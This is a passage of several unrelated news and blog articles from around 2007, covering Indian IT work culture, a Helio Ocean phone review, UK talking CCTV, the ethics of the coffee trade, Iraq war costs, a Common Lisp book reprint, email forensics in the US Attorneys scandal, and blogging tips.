employees can’t stand up , that ’s the most interesting part of the story .
Read on …
The Problem
The software professional Indian is today making more money in a
month than what his parents might have made in an year .
Very often a 21
year old newbie software developer makes more money than his / her 55
year old father working in an old world business .
Most of these
youngsters are well aware of this gap and so work under an impression that
they are being paid an unreasonable amount of money .
They naturally
equate unreasonable money with unreasonable amount of work .
Another imp ortant factor is this whole bubble that an IT person lives
in..
An IT professional walks with a halo around his or her head .
They are the Cool , Rich Gen Next .. the Intelligentsia of the New
World … they travel all over the world , vacation at exotic locations
abroad , talk “ american ” , are more familiar of the geography of the USA
than that of India and yes of course , they are the hottest things in the
Wedding Market !!!
This I feel is the core problem because if employees felt they were
being exploited , things would change .
I speak about this to some of my friends and the answer is generally
“ Hey Harshad , what you say is correct and we sure are suffering , but
why do you think we are being paid this much money ?
It ’s not for 40
hours but for 80 hours a week .
And anyway what choice do we have ?
It ’s
the same everywhere . ”
So can we make things change ?
Is there a way to try and stop an
entire generation of educ ated Indians from ending up with “ no life ” .
Solutions
1 ) Never complement someone for staying till midnight or working 7
days a week .
Recently , in an awards ceremony at a software company , the manager
handing over the “ employee of the month ” award said something like
“ It ’s unbelievable how hard he works .
When I come to office early , I see
him working , when I leave office late , I still see him working ” ..
These sort of comments can kill the morale of every employee trying to
do good work in an 8 hr day .
Companies need to stop hiding behind the excuse that the time
difference between India and the west is the reason why people need to stay
in office for 14 hours a day .
Staying late should be a negative thing
that should work against an employee in his appraisals .
Never
complement someone for staying till midnight or working 7 days a week .
2 ) Estimates :
If time estimates go wrong , the comp any should be willing to take a
hit and not force the employee to work crazy hours to bail projects
out of trouble .
This will ensure that the estimates made for the next
project are more real and not just what the customer has asked for .
3 ) Employee organizations / forums
NASSCOM ( National Association for Software and Services Companies )
and CSI ( Computer Society Of India ) are perhaps the only two well known
software associations in India and both I feel have failed the
software employee .
I do not recall any action from these organizations to
try and improve the working conditions of software employees .
This has
to change .
I am not in favor of forming trade unions for software people , as
trade unions in India have traditionally been more effective at ruining
businesses and making employees inefficient than getting employees
their rights and helping business do well .
So existing bodies like
NASSCOM sho uld create and popularize employee welfare cells at a state /
regional level and these cells should work only for employee welfare
and not be puppets in the hands of the companies .
If the industry does not itself create proper forums for employee
welfare , it ’s likely that the government / trade unions will interfere
and mess up India ’s sunshine industry .
4 ) Narayan Murthys please stand up
Top bosses of companies like Infosys , TCS , Wipro , etc. need to send
the message loud and clear to their company and to other companies
listening at national IT events that employee welfare is really their
top concern and having good working culture and conditions is a
priority .
Employee welfare here does not mean giving the employee the salary
he / she dreams of .
Last word
I am sure some of my thoughts come from the fact that I too worked in
such an environment for a few years and perhaps I have n’t got over
the frustrations I experienced back then .
So think about my views with
a pinch of salt but do think about it .
And if you have an opinion on
this issue , do n’t forget to add a comment to this article
Helio Ocean hands - on review
The Helio Ocean is well covered on SlashGear , so everyone should be familiar with its features as well as what it ’s capable of .
In case you need to get up to speed , take a look at this page then you can come back to this article and understand why I ’m so excited about the Ocean .
As you already know , the Ocean arrived this morning and I ’ve spent the last eight or more hours diving into this beast .
The most important point I want to get across to anyone looking to purchase the Ocean is this : keep your expectations in check .
It ’s a well - featured device ( do n’t just call it a “ phone ” ) , however Helio never intended the Ocean to act as a smartphone in the traditional sense – future versions of the Ocean , perhaps , just not this one .
Okay , that being said lets delve first into the “ personal entertainment center ” , or media player .
It supports MP3 , AAC , WMA , MPEG - 4 , H.264 , VOD and MOD files formats .
While in video mode , flipping from portrait mode to landscape mode is as easy as clicking the down button on the D - Pad or you can simply flip up the Ocean ’s screen .
Since the Ocean is n’t a smartphone , it does n’t handle multi-tasking ; you ca n’t use any other applications such as IMing while listening to music or watching a video .
The software does allow you to surf or buy music from Helio Music store , though .
While you enjoy your tunes , you ’ll still be notified when someone send you an instant message .
Ocean ’s integrated messaging dashboard includes out - of - the - box built - in access to AOL email and AOL Instant Messenger , Yahoo !
Email and Yahoo Messenger , Windows Live Messenger , Windows Live Mail , Hotmail , Gmail , Earthlink email and Helio Mail .
Whew , that was a mouthful and I ’m not even done with the list yet .
In addition , Ocean also supports personal and business email accounts , although right now direct push email , calendar and contacts synchronization from an Exchange Server is n’t available .
Helio informed me that it ’s still being heavily tested and should be available in the upcoming months with no specific time frame .
I discovered two features that
I really do n’t like : not being able to turn off the audio notification for all incoming and outgoing messages without having to put the entire device in silent mode .
Better yet , while in silent mode , it vibrates on all outgoing and incoming instant messages ; trust me , this gets really annoying after a few minutes .
This has been reported to Helio and I ’m hoping there ’ll be a fix for it shortly .
The second annoyance is not being able to hide offline contacts in AIM .
The feature is available for Yahoo !
IM , so I just do n’t understand why Helio did n’t include it in AIM .
Helio added a nice touch by visually notifying of incoming messages while in the home screen , at which point you can choose to either ignore or view the messages .
Also , while in other applications , there ’s a message icon on the top right hand side to the left of the clock notifying you that you still have unread messages .
To answer the several people who ’ve asked , yes , IM does allow you to sign in as invisible .
Ocean will allow you to send images from your album or newly taken photos to friends via instant messenger .
In my tests , however , the images were apparently too big to go through , and even after sizing down the image the transmission failed again for some unknown reason .
If you get this feature to work , make sure to drop me a comment .
It ’s important to note that the Ocean ’s contact list seamlessly syncs with Yahoo ! , AOL and Helio Mail address books , allowing you to quickly find your friends , family and coworkers .
You can either pull up a contact through Helio ’s UI or just type a name from the Ocean ’s idle screen and Smart Dialer searches the handset ’s address book and pulls up full contact information , complete with icons to show if a person is online whether they ’re using Yahoo ! , AIM or Windows Live IM .
The integrated search is a cool feature , eliminating a dedicated , space - consuming search box .
Ocean will even initiate a web search , simultaneously querying multiple search engines including Yahoo , Google , Amazon and Wikipedia , all of which present their results in individual browser tabs .
Ocean sports a 2.4 - inch , 260 K color high - resolution QVGA display , two external speakers residing on the back of the device and support for various Bluetooth protocols such as A2DP .
I did n’t having any problems pairing the Ocean up with the Plantronics 665 and Gennum nX6000 Bluetooth headsets .
However , the Plantronics 260 Stereo Bluetooth headset managed to pair up but was unable to connect to the Ocean .
Luckily I had the Etymotic ety8 Bluetooth Stereo Headset to test – and yes , they mated well .
I bought a couple tracks from the Helio Store and downloads were relatively fast , considering Helio is using Sprint ’s EV - DO network .
I also bought and played a couple of games , all of which were entertaining .
Ocean does not allow you to save downloaded video or music files to external media directly .
You have to download them to the internal memory then manually move them over to the microSD card .
It ’s the same with emails ; the Ocean does n’t allow you to save emails to external storage .
I ’m not a big fan of MySpace , so I did n’t even bother with it .
If you ’ve tested this feature , make sure to add your experience to the comment area .
One of my favorite features of the Ocean ( of all Helio devices for that matter ) is the built - in GPS for Google Maps for Mobile and Buddy Beacon .
Google Maps works as expected and comes with all the usual Google Map goodies .
There is n’t much to add other than the built - in GPS , which provides your approximate location .
For a run-down on Buddy Beacon you can check out my review of the Helio Drift , as the two systems are the same .
Ocean does n’t allow editing of Microsoft Office documents .
You can only view them as text files .
If you ’re crossing over from a Treo , Windows Mobile or Pocket PC Phone , do n’t expect too much from the formatting , because it ’s not pretty .
I suspect that Helio will introduce new software that will at least allow documents to display properly .
Ocean is the first device that Helio designed from the inside out .
It sports one of the first dual slider form factor featuring both an alphanumeric keypad and full QWERTY keypad available .
I found the keyboard easy to use , but it inevitably required some retraining from years of using a tiny keyboard on the Treo and Blackberry devices .
I do n’t like how the space key is only slightly longer than the other keys , and I found myself mistakenly hitting the backspace key instead of the enter key quite often .
Other than that , the keyboard is easy to use and very comfortably spaced out for typing with your thumbs .
The keyboard ’s upper set of keys on the Ocean is too close together and cramped but you ’ll find a way to get use to it .
As far a comparing the Sidekick 3 ’s keyboard to the Ocean , I have to say I like the Sidekick 3 more .
Again , this is a matter of preference , and I also like the cramped layout of the Treo 755 p ’s keyboard so do n’t take my word for it !
You need to test the Ocean out for yourself to see what ’s best for you .
Ocean vs. Sidekick3 ’s keyboard layout :
Physically turning the Ocean horizontally and flipping it up will automatically change the screen orientation , and vice versa .
This feature already exists in other devices such as the HTC 8525 , so nothing new here .
But what ’s really cool is that if for some reason you answer a call while in horizontal landscape mode and you ’re not using your headset , the call automatically is placed in speakerphone made .
If you slide the keyboard closed , the call will continue and the speakerphone is automatically turned off .
Unfortunately , Ocean does n’t allow you to do anything else while using the phone ; incoming instant messages , for instance , do n’t get delivered until after the call ends .
Voice calls , whether you ’re using the mic or speakerphone , were clear and crisp .
Helio makes it very easy to add numbers to existing contacts or simply create a new contact based on a phone number in your recent call list .
Helio is actively working on a solution for Mac owners .
As of now , there ’s no easy way to sync the Ocean with OS X .
What ’s in store for the Ocean in the near future ?
Expect more downloadable apps , MySpace v2 ( coming early next week ) , Helio UP is being enhanced for integration with more services that will take advantage of GPS coordinate tagging of your pictures ( that ’s all I know for now so stay tuned for more info ) .
According to Helio , Ocean is a platform upon which Helio will keep innovating and delivering firsts .
So it looks like the Ocean is a sure bet and wo n’t be obsolete in the near future if you ’re flirting with the idea of getting one .
Would I recommend the Ocean ?
The short answer is a definite yes , with the understanding that what you ’re looking for is a well - featured device and not a smartphone .
It ’s still too early for me to rate the Ocean , since I ’ve had just 12 hours of usage on it , but you can be sure that SlashGear will bring you a follow - up report very soon !
The Ocean costs $ 295 .
Plans with unlimited data access starts from $ 65 to $ 135 per month , depending on the number of voice minutes .
If you want an all - you - can - eat plan for data and minutes , be ready to shell out $ 145 a month .
UPDATE 5/10/2007 :
Ocean CAN multi-task , but does only for specific apps .
The IMS client is always running in the background .
You can surf the web while listening to music .
Etc .
It ’s just that Ocean was designed to multi-task around specific use cases .
Remember , it ’s not a smartphone ( but it ’s starting to blur the lines between a featurephone and a smartphone ) .
I stated the following in the review :
“ Ocean will allow you to send images from your album or newly taken photos to friends via instant messenger .
In my tests , however , the images were apparently too big to go through , and even after sizing down the image the transmission failed again for some unknown reason . ”
It ’s important to note that I got Ocean as a pre-release , before market availability .
Helio ’s IMS servers are still undergoing preparations for production .
This stuff is to be expected and that particular function may not yet be enabled .

Big Brother Watches -- And Chides -- In The U.K .
The British government plans to spend nearly $ 1 million ( U.S. ) on interactive surveillance cameras that do n't just watch people .
They scold them , too .
British authorities are installing talking surveillance cameras that chide people when they 're up to no good .
The government 's privacy watchdog , the Information Commissioner , already deemed Britain a " surveillance society . "
Now , the BBC reports that the government plans to spend nearly $ 1 million ( U.S. ) on interactive surveillance cameras that do n't just watch people .
They scold them , too .
Some of the cameras are already up , stopping fights and discouraging public drunkenness , according to government sources .
They are also essentially baby - sitting the public by telling litterbugs they 've been caught in the act and directing them to nearby trash receptacles .
It 's not clear if those receptacles are equipped with the radio frequency identification readers that have gained public and media attention recently .
The Daily Mail has an account of shocked pedestrians and bicyclists nearly falling over when voices that seem to come from nowhere scold people committing minor legal infractions .
One news report described a brawl in which the participants ran in opposite directions after being warned against fighting by a voice from the sky .
Staffers monitor the cameras from a control room and send their warnings through loudspeakers installed in 12 cameras around Middlesbrough .
Home Secretary John Reid has announced that the talking cameras will be installed in about 20 more locales , including London .
The government 's Home Office announced that the talking closed - circuit cameras had an immediate effect .
The United Kingdom has also announced a contest , inviting children to compete to become the " voice of respect . "
The children will take part in a campaign to remind adults to be respectful , according to information from the Home Office .

Two billion cups are sold daily in a £ 40bn global industry , but now a controversial documentary showing the plight of growers asks whether there is such a thing as ethical coffee .
David Smith reports
It was at Sundance , Robert Redford 's film festival held in the Utah mountains , that Black Gold became more than just another angry film .
Nick and Marc Francis , the British brothers who made the low - budget documentary about the global coffee trade , were asked by a sell - out audience how much it would cost to help farmers finish building a school they had filmed in Ethiopia .
The answer was $ 10,000 .
An audience member raised his hand and pledged to donate the full amount .
He wrote a cheque on the spot .
Black Gold is galvanising audiences wherever it plays .
The Francis brothers receive hundreds of emails a day from people in the coffee industry who , appalled by images of women in factories handpicking coffee beans for wages of half a dollar a day , want to change the way they do business .
Employees of the multinationals which dominate the £ 40 bn - a - year coffee industry - the world 's second most valuable after crude oil - have told the brothers they had no idea they were perpetuating such a system .
Marc said : ' At the end of the day , every cup of coffee we drink relies on exploitation . '
It is not a message the coffee giants wish to gain currency .
Starbucks reportedly sent an email to its employees in Britain describing Black Gold as ' inaccurate and incomplete ' before it was screened at the London Film Festival .
At Sundance , the company distributed a statement saying that it thinks ' coffee farmers should make a living wage and be paid fair prices ' , and invited the Francis brothers to its headquarters in Seattle , having previously refused to grant them an interview .
Black Gold - which cost £ 325,000 to make - has made waves at film festivals in Melbourne , Rio de Janeiro , Rome and all over America .
It was shown to MPs at Westminster earlier this year .
Next Saturday , the Francis brothers are to speak at a preview screening at the Guardian Hay Festival in Hay - on - Wye , and the film goes on general release the following week .
Nick said : ' We want to make people think about what 's at the bottom of the coffee cup , and that has set alarm bells ringing in the big companies .
Questions are being asked about how they can talk a lot about corporate responsibility yet not pay coffee farmers a decent price .
We 've had shareholders and employees of those companies writing to us saying , " We did n't know this . "
One worker in Starbucks said he was never going to serve latte in the same way again . '
The film represents a career breakthrough for Londoners Nick , 28 , and 31 - year - old Marc , who directed and produced Black Gold .
They set up the production company Speak - it Films in 2002 and have focused on social and human rights issues .
' Black Gold came about when we learnt that Ethiopia was facing another famine , but also because it was the 20th anniversary of the Live Aid concert , ' Marc said .
' Being brought up in a generation surrounded by images of barren landscapes and starving children , we were always told to give food aid and the problem will be solved .
We wanted to present another angle here : how can it be there is famine in Ethiopia and yet there is a booming coffee trade on its doorstep ?'
Black Gold tells the story of Tadesse Meskela , manager of the Oromia Coffee Farmers Co-operative Union in Ethiopia , the birthplace of the plant now cultivated in more than 50 countries .
Meskela goes on a mission to save the 74,000 struggling coffee farmers in the co-operative from bankruptcy , attempting to beat the system by finding buyers willing to pay a fair price for high quality .
The film follows his journey to London and Seattle and portrays him as a David against the Goliath corporations , New York commodity traders , international coffee exchanges and the World Trade Organisation .
He has subsequently put his case to Tony Blair at Downing Street .
There are few products of capitalism more pertinent than coffee , the world 's most popular drink , with more than two billion cups drunk every day .
And there are few products more economically complex .
The final price of a cup of coffee in the West will have absorbed the costs of insurance , taxes , transport , processing , packaging , marketing , storage and much more .
But of the £ 2 charged for a cappuccino in a British coffee shop , an average farmer gets less than 2p .
' Coffee is one of the least transparent industries in the world , ' said Nick .
' We 're supposed to be marking 200 years since the abolition of slavery .
The coffee industry is not slavery , but when people are being paid half a dollar a day it is not far off .
The companies argue that it 's better than nothing , and that 's a problem .
By which standard is an equitable wage being judged ?
The companies who supply us with coffee would n't treat their own employees the same way .
' The whole debate about sustainability has been hijacked by Starbucks .
When they talk about their programmes for employees - for example , healthcare - they do n't talk about farmers as part of their workforce .
You go to a shop and see pictures of happy , smiley coffee farmers , but we need to go back to the value chain and ask how much of the $ 3 cappuccino or latte goes to the farmer ? '
Amid the praise for the film , there are voices of dissent .
Some experts say the film 's thesis is too simplistic , not least in its juxtaposition of emotive images of struggling Africans with clips of overweight latte drinkers .
Mark Pendergrast , author of Uncommon Grounds : The History of Coffee and How It Transformed Our World , said : ' Black Gold is very good in terms of raising issues , but it 's a very unfair film because the implication is that Starbucks is starving people in Ethiopia .
That 's a very black - and - white way of looking at an issue with many shades of grey .
Starbucks have one of the best sustainable practices in the world , although they do a bad job of communicating it .
Yes , they could do more , but if you want to pick a bad guy in coffee , Starbucks is not it . '
The Francis brothers deny they set out to demonise the high street chain .
Nick said : ' We do n't see our film as a Super Size Me , running around trying to bash Starbucks .
It 's a shame the attention got drawn to them when it should be on Kraft , Nestlé , Proctor & Gamble and Sara Lee , but their logos are not everywhere , whereas Starbucks draw attention to themselves .
Essentially the market is dominated by these four companies , who set the price , then it gets chipped away and penalises people at the end of the chain .
Yes , it 's a problem of the system , but it 's not helped by the big corporations - they have a massive responsibility . '
Marc said : ' These companies [ in the coffee business ] have more revenue than a lot of African nations .
They make billions from coffee , while the very people who prop up their billion - dollar empires are struggling to survive . '
But Pendergrast argues that the chain of supply and demand is complicated and that it is facile to portray the big companies as caricatures of greed .
The exploitation of coffee farmers is not , he argues , a straightforward whodunnit .
' If you follow where the money goes , it 's very difficult to say this is the bad guy , he 's making all the money , ' he said .
' You can't really say it 's the evil importer , evil exporter , evil roaster - they all make a little money along the way .
I would like to see the big four pressured , but they 're also locked in : they have to please their shareholders and they 're all competing with each other .
Ultimately the marketplace determines the price of coffee : nobody can manipulate it because it is produced by too many people in too many countries . '
Down a dirt track in the Taquara Preta mountains of southern Brazil lies the farm of the Dutra brothers , Ednilson and Walter .
To those who dream of a rural sanctuary , their existence appears idyllic : a white - and - yellow walled farmhouse under a red slate roof surrounded by flowers and trees , palm leaves , thick forests and green mountains so high that their peaks are hidden among the clouds .
At 1,000 metres above sea level , these are perfect conditions for growing high - quality coffee which commands a higher than average price .
The Dutra brothers sell theirs to Illycaffe , an Italian firm which features heavily in Black Gold .
Illy specialises in the luxury end of the market : a cup of its espresso requires 50 ' perfect ' beans and is priced accordingly .
The company 's clients in London include Harvey Nichols , Tate Modern and the Oxo Tower .
In Brazil , Illy pays growers around 30 per cent above the market average , sends them to a ' University of Coffee ' and gives cash prizes to the winners of an annual quality award competition .
Alessandro Bucci , its buyer in the region , said : ' We recognise the effort of the growers , not the other players .
We pay them directly , with real transparency , and give them our knowledge and commitment to a long - term relationship . '
Sitting in a comfortable room with wooden furnishings and a portrait of Pope John Paul on the wall , Walter Dutra praised the company : ' We have been coffee - growers since we were kids , but we did n't know the quality of the coffee we produced .
By chance we saw an advert for the Illy competition in 1999 and began selling them coffee .
I attended Illy 's university in Sao Paulo and learnt how to get quality .
The next year we achieved fourth in the competition . '
Illy 's target is consumers who are willing to pay more for a combination of quality and sustainability .
The firm is praised by Oxfam and experts such as Pendergrast .
Illy admits employing women in Indian factories to handpick the few bad beans from thousands of good ones for wages of £ 1.50 a day ; according to the Francis brothers , it does the same in Ethiopia for 25 p a day .
Nor is the family - owned firm in Trieste about to conquer the world .
It works with 4,000 growers and its single blend remains a niche product , not yet close to challenging the big four , who control more than 70 per cent of all coffee sold .
This economic reality is felt on the ground : the Dutra brothers sell only 10 to 15 per cent of their coffee to Illy , with the rest still vulnerable to the whims of the market .
Last year they made losses of £ 110,000 .
Illy 's claim to the moral high ground has also been questioned because it is not certified by the Fairtrade Foundation , whose criteria guarantee better prices , decent working conditions , local sustainability and fair terms of trade for farmers and workers .
Illy says this is because Fairtrade works with small growers who are already part of a farmers ' co-operative and does not take quality into account , whereas it trades directly with the best growers of various sizes .
Bucci adds :
' We want to make sure the money goes directly to growers , not the co-operative . '
The ambiguity illustrates the growing confusion over certification schemes , which include Fairtrade , the Rainforest Alliance , which has an environmental emphasis , and Starbucks ' own CAFE ( Coffee and Farmer Equity ) Practices scheme .
Nick Francis said : ' You ca n't expect the consumer to do a cross - benefit analysis of every different brand .
Companies have played with the language .
Kenco have a coffee called Sustainable Development with a picture of a smiling coffee - grower on the packet .
We 've seen an absolute hijack of well - intentioned systems because companies want to be associated with them . '
Fairtrade aims to pay coffee - growers enough to cover the cost of production and allow a margin for further investment .
But it , too , has recently been challenged by a series of media exposés , and lost its partnership with one American coffee seller who argued that the collectivisation of small farmers , which Fairtrade encourages , ' disincentivises the hardest workers .
In the end , what you get is coffee that is solidly mediocre . '
Marc Francis said that Fairtrade itself does not go far enough .
' We see the Fairtrade system as a good start , but it is not the ultimate solution .
If everyone went out tomorrow and bought Fairtrade coffee , we 'd still be in a situation where the lives of farmers need to be seriously improved . '
His view was echoed by Bryant Simon , an American academic whose next book will be entitled Consuming Starbucks .
' There 's a sense that if you pay for Fairtrade you do n't have to worry , like seeking absolution in the church .
But there is no such thing as an ethical cup of coffee , because the commodity brand economy has never been ethical .
People need to be aware that when they 're buying a coffee they 're buying a long and complicated network of labour and it does involve women and children .
If you want economic justice , you 've got to do a lot more than pay £ 2 for a cup . '
But Simon , who spent a year visiting more than 400 Starbucks branches in several countries , detects a cultural change in the air : ' All the companies are getting involved in sustainability schemes because there is , somewhere out there , a desire for a change to global trade .
People are not content to be part of an empire that exploits any more . '
Black Gold appears to be speaking directly to that desire , forcing the companies - which all refused the Francis brothers ' interview requests - to meet them and prepare their responses .
Jonathan Horrell , corporate affairs director of Kraft , the owner of Kenco , said : ' There 's an awful lot in Black Gold that we welcome and agree with in terms of the hardship of producers .
We pay a premium on an increasing range of products that are certified by the Rainforest Alliance , including our Sustainable Development brand , which is a niche one . '
But he admitted : ' It 's still small compared with our overall business .
We buy to the market price , we do n't set the market price . '
Companies such as Kraft claim they are beholden to the market , their shareholders and the consumer .
The Francis brothers believe that consumers , however politicised they have become , should not have to bear the full burden , and call on business , governments and trade organisations to take a moral lead .
Meanwhile , a highly complex industry , bound up with the inequalities of global capitalism , continues to keep the Ethiopian coffee - grower and the Starbucks coffee - consumer planets apart .
Some believe the only answer is an African - owned Nestlé , an ' Ethiobucks ' .
Until then , can we buy ethical coffee anywhere ?
When asked , the makers of Black Gold , for once , hesitated .
Nick 's eventual reply was not wholly optimistic : ' The question for consumers is whether we can find a coffee that is less exploitative than the others .
Maybe that is all we can say for now . '

The Senate today voted to keep the timeline in the Iraq bill .
Who would have thought it would come down to the wire in Nebraska ?
Though the congressional debate is getting most of the attention -- as it should -- we still need to remember the crazy amount of money we 're shoveling out the door to support our " defense " .
I put that in quotations on purpose ... because the level of spending is so high and the debate about it so inadequate , and we are so NOT funding the solutions that will keep us safe in the long run .
Last year a Congressional Research Report put the average per troop costs for Iraq are between $ 355,000 and $ 360,000 per individual , per year ; this dollar amount has been increasing since 2003 .
The last report came out this month put the cost of the wars so far at around $ 752 billion .
gulp .
But the public is continually mis-educated about defense spending --- so it is n't surprising that many people believe a fallacy : the more we spend on defense , the more security we purchase .
Continually , we hear how today 's defense budget is just over 4 % of GDP ... far lower than at any point in recent history .
NPR repeated this trope yesterday .
But journalists almost always fail to mention how gigantic our economy has grown in comparison to the World War II era .
Even worse ,
They do n't place this figure in context .
The most important fact for taxpaying citizens is that the defense budget now takes up more than half of all the dollars we have available to spend every year .
This year , its at 59 % for 08 not including war spending .
The amount of dollars is getting smaller and smaller for everything else .
Here 's a fantastic video on the topic .
There 's no end to the lameness of the mainstream coverage .
Today the New York Times framed this question
I just found out that Apress has decided it ’s time for a third printing of Practical Common Lisp .
If I recall correctly , the first printing was 5,000 copies , the second 3,000 more .
New printings are called for when the publisher thinks they ’re going to run out of copies to sell to distributors so this must mean I ’m not crazy to dream of someday having a 10 k - copies - sold party .
This also means now would be a good time , if you ’ve read the book and noticed any errors that you ’ve not emailed me about , to send a note .
If you put “ pcl errata ” in the subject it ’ll make my life a bit easier .
Note , however , that this is just a new printing not a new edition .
For a new printing we just fix minor typos and so forth so now is not the time to tell me that there should really be a chapter about how to connect to RDBMSes or what have you .

Why email matters :
The science behind the US Attorneys scandal Steve Burgess
Published : Wednesday April 25 , 2007 Print This Email
This Email , which is more and more in the news these days , is close to the center of the current US Attorney firing scandal , and for good reason .
A substantial amount of communication flows via email , which is nearly instantaneous , costs almost nothing , and has in large part replaced the paper memo .
Email also provides a path of inquiry that previously was unavailable to investigators .
A paper document can be shredded or burned , while email leaves a trail even when deleted .
Furthermore , unlike a piece of paper , the email itself reveals who sent it and who received it , when and where .
As Senator Patrick Leahy says ,  You can't erase e-mails , not today
They 've gone through too many servers .
Those e-mails are there 
There are three kinds of email systems in common use .
The most familiar is the email client program , a genre that includes Microsoft Outlook Express , Mozilla Thunderbird , Macintosh Mail , and Netscape Mail .
These programs store data mainly in text form , rather than in cryptic computer language .
Generally all of the individual emails in a single mailbox ( such as the  In or  Sent mailbox ) are stored together as a single file .
Each mailbox file is then represented by an entry in an index that functions something like a table of contents .
When a single email is deleted , it is truncated from the mailbox file , but its data is not actually removed from the computer .
Even when an entire mailbox is deleted , its entry is removed from the file index , but the actual body of the file does not disappear from the computer .
The area on the computers hard disk that holds the file is marked as available to be reused , but the files contents will not immediately be overwritten and hence may be recoverable for a considerable period of time .
The computer forensics specialist is able to search the ostensibly unused portion of the hard drive for text that may have been part of an email .
The expert can look for names , phrases , places , or actions that might have been mentioned in an email .
The email also contains additional internal data that tells where it has been and who it has been sent to .
As an example of such data , I just sent my wife a 17 - word message titled ,  Where s this email from ? 
She replied ,  Darling , Surely you must mean ,  From where is this email ? 
Love , Your grammatically correct wife .
Her reply is only 15 words , yet when I look underneath what is displayed on the screen , I see the email actually contains 246 words .
Where did the rest of it come from ?
The extra information includes a return path with my beloveds America Online ( AOL ) email address , her computers IP address , the IP addresses of three other computers , both email addresses repeated another three times each , the names of three or four mail servers , and four date / time stamps .
Oh , and lest I forget , theres an ad for AOL at the end .
( IP  stands for Internet Protocol . 
Every computer that is hooked up to a network has an IP address . )
If I forwarded or copied the email , it would have more information added , most notably the email addresses of the other people to whom I copied or forwarded the message .
By looking at the IP addresses and doing a little more investigation , I could tell the approximate physical location of the computers with the given IP addresses .
I could see who else was involved in the string of communication , and approximately where they were located .
In an investigation , if a judge saw multiple email addresses indicating that other people might be involved , and if the original party was not forthcoming with all the information requested , the judge might allow the computers specified by the other email addresses to be inspected .
Then the great officially sanctioned fishing expedition could begin in earnest .
That is why we read headlines such as this one , which appeared on the ThinkProgress website on April 12 , 2007 : White House Originally Claimed RNC Emails Were Archived , Only  Handful  Of Staffers Had Accounts .
In a press conference , White House Deputy Press Secretary Dana Perino had said that just a handful of White House staffers had RNC ( Republican National Committee ) email addresses .
It may have been in the face of the inevitable discovery , that the White House was soon forced to admit that more than 50 top officials had such RNC email addresses  that s 10 handfuls by most counts .
In his article Follow the e-mails , Sidney Blumenthal says ,  The offshoring of White House records via RNC e-mails became apparent when an RNC domain , gwb43.com ( referring to George W. Bush , 43rd president ) , turned up in a batch of e-mails the White House gave to House and Senate committees earlier this month .
Rove 's deputy , Scott Jennings , former Bush legal counsel Harriet Miers and her deputies strangely had used gwb43.com as an e-mail domain .
The production of these e-mails to Congress was a kind of slip .
Indeed .
This is exactly the kind of information that computer forensics experts like to have to assist in their process of electronic discovery .
In my own e-discovery work , I have found more than a half million unexpected references on a single computer .
Investigators may now be able to search the computers at the RNC , in the White House , and at the locations that host computers for both , as well as those laptops and Blackberries used by staffers of these organizations .
The search will be on for any occurrence of gwb43   a search that is likely to turn up more email addresses and more email , whether deleted or not .
I mentioned three types of email at the beginning of this article but only talked about the one that has the most promise for turning up deleted data .
The second type is represented by Microsoft Outlook , while the third is commonly known as web mail or Internet mail .
Outlook stores its data all in one encrypted file on a users computer , on a mail server , or on both , depending upon the configuration of the server .
All mailboxes are in the same encrypted file .
Computer forensics specialists have tools to allow the decoding of this file in a fashion that can often bring back many or all of the deleted emails .
The email server may also have backups of the users mail .
Web mail , where the user is essentially looking at a web page that is displaying mail , keeps all its emails on a remote server ( such as on AOLs large farm of mail servers ) and little or nothing is on the users own computer .
Such remote mail servers are so dynamic that any deleted email is likely to be overwritten in a matter of minutes .
Blumenthal references the advantages that such systems may have for those who wish to hide information in Follow the e-mails :  As a result , many aides have shifted to Internet E-mail instead of the White House system .
 It 's Yahoo ! , baby ,  says a Bushie . 
On the other hand , while such email content may be hard to find once deleted , logs of access to the email accounts are likely to be retained for quite a long time and may be of some use in an investigation .
The upshot is that , unlike paper documents , email may be widely broadcast , sometimes even by accident .
Also unlike paper , which is destroyed once shredded , it is likely that copies of deleted messages exist elsewhere .
To paraphrase Senator Leahy , electronic data can be near immortal .
A further difference is that email contains data that tells who drafted it , when , and where it went .
The current US Attorney scandal has shown us once again that email is not only a valuable tool for communication , but has the benefit ( or detriment , depending on your perspective ) of providing additional transparency to the otherwise closed rooms of our leaders .

Let Your Blog Posts Marinate ( 4 Steps to Forming Great Ideas )
Man , I ca n’t tell you how valuable this blogging tip is .
Here ’s what my typical blog posting process used to look like .
I ’d go hit up my RSS feeds , flag the feeds I wanted to write about and crank out whatever I was thinking of at the time , all in one session .
Occasionally I ’d get some winners out of that p rocess , but mostly my writing just sucked .
My biggest problem : I did n’t think through the structure of the blog post .
I ’ve always had what I would call “ writers ADD ” .
I would write about whatever thought came into my mind at the time of reading the articles , knee - jerk style .
Now , before I go any further with this , I want to give the little disclaimer that some people pull this off and do a wonderful job at it .
Why ?
Because they ’re much better writers than me .
I have to let my mind process what I ’m going to say before I write about it , otherwise it ’s really really hard to follow .
In order to improve my writing , I ’ve had to develop an intricate 4 - part posting process , but it ’s managed to work for me .
Hopefully this will help some of you that struggle with developing your blog posts .
1. Jot It
If you ’ve got a post idea , jot down the title and maybe some key thoughts about the idea .
For me it ’s whatever I can think of in about 20 seconds .
After that , I just let it be .
You may not even look or think about the idea the rest of the day .
Just collecting it is what ’s important .
2. Review it
Every day I ’ll pull up my list of post ideas that I have n’t written about .
I ’ll glance through the titles and bullet points , and see if anything triggers a thought .
If it does , I ’ll write down another bullet point or idea .
If not , I let it be .
Usually more ideas for the posts come up when I ’m doing something else .
3. Let It Develop
It ’s hard to say how long this step lasts .
Sometimes it ’s all over in 15 - 20 minutes .
Sometimes it takes weeks .
The important thing is not to rush the process .
4. Post
Once you feel like your post is fully developed , start writing .
Many times , I ’ll start writing and realize that I do n’t like the way the post is turning out .
When this happens I just save the post as a draft , and let it marinate even longer by repeating steps 2 and 3 .
I always try to read through the finished post at least a couple of times to catch my bad spelling and grammatical woes .
Sometimes the structure is n’t quite right , and I ’ll tweak that too .
By always having a queue of collected ideas , you ’ll never run out of material to post .
And if , God forbid , you actually run out of content for a day ( gasp ! ) , do n’t force the issue .
Just let it go and skip posting that day .
If you force something , odds are it wo n’t be that good anyway .
And nothing ruins a blog like crappy articles .
Take my word for it .
By letting the blog post develop naturally , your writing will become easier .
Why ?
Because you ’ve already been typing away about it in the back of your brain for a while .
You ’ll almost have the key points memorized without checking your notes .
Successful blogs are a thing of love , and readers can spot an un-loved blog a mile away .
Ask yourself this :
Would you read a blog that looked like the writer himself did n’t care about it ?
I know I would n’t .

Most British women considering breast enlargement surgery want their busts to be just a bit bigger and say it is n't to attract men .
REUTERS / Sergio Moraes
LONDON ( Reuters Life ! ) -
